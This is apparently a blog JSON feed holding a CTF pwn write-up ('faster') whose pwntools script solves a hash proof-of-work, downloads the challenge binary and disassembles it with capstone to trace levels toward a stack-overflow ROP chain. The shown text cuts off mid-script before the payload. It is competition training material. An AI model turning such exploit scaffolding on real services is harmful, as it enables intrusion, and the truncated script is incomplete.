{
    "version": "https://jsonfeed.org/version/1",
    "title": "小姜天堂",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2020/09/09/faster/",
            "url": "http://example.com/2020/09/09/faster/",
            "title": "",
            "date_published": "2020-09-09T00:31:10.606Z",
            "content_html": "<h3 id=\"faster\"><a class=\"anchor\" href=\"#faster\">#</a> faster</h3>\n<ul>\n<li>求解 pow</li>\n<li>capstone 反汇编，依次求解每一层正确的输入值</li>\n<li>栈溢出，构造 ROPchain</li>\n</ul>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> hashlib<span class=\"token punctuation\">,</span> itertools<span class=\"token punctuation\">,</span> string<span class=\"token punctuation\">,</span> base64</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> capstone <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch <span class=\"token operator\">=</span> <span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>token <span class=\"token operator\">=</span> <span class=\"token string\">\"icq947dbf7d511024e3e7be0d0aebd59\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>HOST<span class=\"token punctuation\">,</span> PORT <span class=\"token operator\">=</span> <span class=\"token string\">\"39.96.72.181\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">42732</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>HOST<span class=\"token punctuation\">,</span> PORT<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">solver</span><span class=\"token punctuation\">(</span>val<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    alpha_set <span class=\"token operator\">=</span> string<span class=\"token punctuation\">.</span>printable</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    algorithm <span class=\"token operator\">=</span> <span class=\"token builtin\">getattr</span><span class=\"token punctuation\">(</span>hashlib<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> itertools<span class=\"token punctuation\">.</span>permutations<span class=\"token punctuation\">(</span>alpha_set<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        s <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">if</span> algorithm<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> val <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">return</span> s</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"GG not found...\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">11</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"x[:20] = \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>val <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;built-in function openssl_\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>name <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\">\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125; &amp; &#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>val<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>res <span class=\"token operator\">=</span> solver<span class=\"token punctuation\">(</span>val<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"> \"</span><span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Please input your token: \"</span><span class=\"token punctuation\">,</span> token<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Creating pwn file, please wait ...\\n\\n\\n\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>data <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\\n\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>bindump <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"recv.tar.gz\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"wb\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>bindump<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>os<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">\"tar -zxf recv.tar.gz -C ./chal\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>os<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">\"upx -d chal/pwn*\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>os<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">\"mv chal/pwn* ./pwn2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your docker run port [\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>port <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"]\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"password is \\\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>password <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"port: &#123;&#125;, password: &#123;&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">,</span> password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token comment\"># '''</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token comment\"># binary: ./pwn-chal</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token comment\"># write analysis here...</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token comment\"># write exp in payload</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token comment\"># '''</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>HOST<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Please input your password: \"</span><span class=\"token punctuation\">,</span> password<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"/lib/x86_64-linux-gnu/libc-2.23.so\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./pwn2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./pwn2\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    bytecode <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>md <span class=\"token operator\">=</span> Cs<span class=\"token punctuation\">(</span>CS_ARCH_X86<span class=\"token punctuation\">,</span> CS_MODE_64<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">find_main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\toffset <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>vaddr_to_offset<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>entrypoint<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\tdisasm_result <span class=\"token operator\">=</span> md<span class=\"token punctuation\">.</span>disasm<span class=\"token punctuation\">(</span>bytecode<span class=\"token punctuation\">[</span>offset<span class=\"token punctuation\">:</span>offset <span class=\"token operator\">+</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> elf<span class=\"token punctuation\">.</span>entrypoint<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> disasm_result<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\t    <span class=\"token comment\"># print(\"0x%x:\\t%s\\t%s\" %(i.address, i.mnemonic, i.op_str))</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\t    <span class=\"token keyword\">if</span> <span class=\"token string\">\"rdi\"</span> <span class=\"token keyword\">in</span> i<span class=\"token punctuation\">.</span>op_str<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\t    \tmain_addr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">.</span>op_str<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">.</span>op_str<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span><span class=\"token string\">\",\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\t    \t<span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>\t<span class=\"token keyword\">return</span> main_addr</pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">find_level0</span><span class=\"token punctuation\">(</span>main_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>\toffset <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>vaddr_to_offset<span class=\"token punctuation\">(</span>main_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>\tdisasm_result <span class=\"token operator\">=</span> md<span class=\"token punctuation\">.</span>disasm<span class=\"token punctuation\">(</span>bytecode<span class=\"token punctuation\">[</span>offset<span class=\"token punctuation\">:</span>offset <span class=\"token operator\">+</span> <span class=\"token number\">0x1000</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> main_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>\tcall_index <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> disasm_result<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> i<span class=\"token punctuation\">.</span>mnemonic <span class=\"token operator\">==</span> <span class=\"token string\">\"call\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>\t\t\tcall_index <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> call_index <span class=\"token operator\">==</span> <span class=\"token number\">5</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>\t\t\t\tlevel0_addr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">.</span>op_str<span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>\t<span class=\"token keyword\">return</span> level0_addr</pre></td></tr><tr><td data-num=\"95\"></td><td><pre></pre></td></tr><tr><td data-num=\"96\"></td><td><pre></pre></td></tr><tr><td data-num=\"97\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">check</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> level<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>\toffset <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>vaddr_to_offset<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>\tdisasm_result <span class=\"token operator\">=</span> md<span class=\"token punctuation\">.</span>disasm<span class=\"token punctuation\">(</span>bytecode<span class=\"token punctuation\">[</span>offset<span class=\"token punctuation\">:</span>offset <span class=\"token operator\">+</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> disasm_result<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> i<span class=\"token punctuation\">.</span>mnemonic <span class=\"token operator\">==</span> <span class=\"token string\">\"cmp\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>\t\t\tcurrent_level <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">.</span>op_str<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">.</span>op_str<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span><span class=\"token string\">\",\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>level <span class=\"token operator\">==</span> current_level<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre></pre></td></tr><tr><td data-num=\"109\"></td><td><pre></pre></td></tr><tr><td data-num=\"110\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">find_next</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">,</span> level<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>\toffset <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>vaddr_to_offset<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>\tdisasm_result <span class=\"token operator\">=</span> md<span class=\"token punctuation\">.</span>disasm<span class=\"token punctuation\">(</span>bytecode<span class=\"token punctuation\">[</span>offset<span class=\"token punctuation\">:</span>offset <span class=\"token operator\">+</span> <span class=\"token number\">0x1000</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>\tcall_index <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> disasm_result<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> i<span class=\"token punctuation\">.</span>mnemonic <span class=\"token operator\">==</span> <span class=\"token string\">\"call\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>\t\t\tcall_index <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> call_index <span class=\"token operator\">></span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>\t\t\t\tnext_level_addr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">.</span>op_str<span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>check<span class=\"token punctuation\">(</span>next_level_addr<span class=\"token punctuation\">,</span> level<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>\t<span class=\"token keyword\">return</span> next_level_addr<span class=\"token punctuation\">,</span> call_index<span class=\"token operator\">-</span><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre></pre></td></tr><tr><td data-num=\"123\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">check_last</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>\toffset <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>vaddr_to_offset<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>\tdisasm_result <span class=\"token operator\">=</span> md<span class=\"token punctuation\">.</span>disasm<span class=\"token punctuation\">(</span>bytecode<span class=\"token punctuation\">[</span>offset<span class=\"token punctuation\">:</span>offset <span class=\"token operator\">+</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> disasm_result<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> i<span class=\"token punctuation\">.</span>mnemonic <span class=\"token operator\">==</span> <span class=\"token string\">\"cmp\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> <span class=\"token string\">\"eax\"</span> <span class=\"token keyword\">in</span> i<span class=\"token punctuation\">.</span>op_str<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>\t\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre></pre></td></tr><tr><td data-num=\"133\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">find_last</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>\toffset <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>vaddr_to_offset<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>\tdisasm_result <span class=\"token operator\">=</span> md<span class=\"token punctuation\">.</span>disasm<span class=\"token punctuation\">(</span>bytecode<span class=\"token punctuation\">[</span>offset<span class=\"token punctuation\">:</span>offset <span class=\"token operator\">+</span> <span class=\"token number\">0x1000</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>\tcall_index <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> disasm_result<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> i<span class=\"token punctuation\">.</span>mnemonic <span class=\"token operator\">==</span> <span class=\"token string\">\"call\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>\t\t\tcall_index <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> call_index <span class=\"token operator\">></span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>\t\t\t\tnext_level_addr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">.</span>op_str<span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>check_last<span class=\"token punctuation\">(</span>next_level_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>\t<span class=\"token keyword\">return</span> next_level_addr<span class=\"token punctuation\">,</span> call_index<span class=\"token operator\">-</span><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre></pre></td></tr><tr><td data-num=\"146\"></td><td><pre></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>main_addr <span class=\"token operator\">=</span> find_main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>level0_addr <span class=\"token operator\">=</span> find_level0<span class=\"token punctuation\">(</span>main_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre></pre></td></tr><tr><td data-num=\"150\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>level0_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre></pre></td></tr><tr><td data-num=\"152\"></td><td><pre></pre></td></tr><tr><td 